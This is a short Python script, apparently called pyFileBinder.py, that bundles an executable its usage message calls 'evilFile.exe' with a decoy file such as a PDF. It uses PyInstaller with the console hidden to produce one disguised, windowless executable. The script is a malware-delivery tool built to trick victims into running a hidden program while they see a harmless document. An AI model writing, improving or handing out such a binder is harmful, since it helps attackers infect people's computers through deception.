import os, sys, re

try:
    evilFile = sys.argv[1]
    normalFile = sys.argv[2]
    imageFile = "images\\image.jpg"
except:
    print('try: python pyFileBinder.py evilFile.exe normalFile.pdf')

try:
    with open("include\\demo.py","rt") as fin:
        with open("pyinstall.py","wt") as f:
            for line in fin:
                f.write(line.replace('demo.exe', evilFile).replace('demo.pdf', normalFile))
except:
    print('try: python pyFileBinder.py evilFile.exe normalFile.pdf')

cmd = 'include\\pyinstaller -F pyinstall.py --add-data "{};." --add-data "{};." --add-data "{};images" -w --noconsole'.format(evilFile,normalFile, imageFile)
os.system(cmd)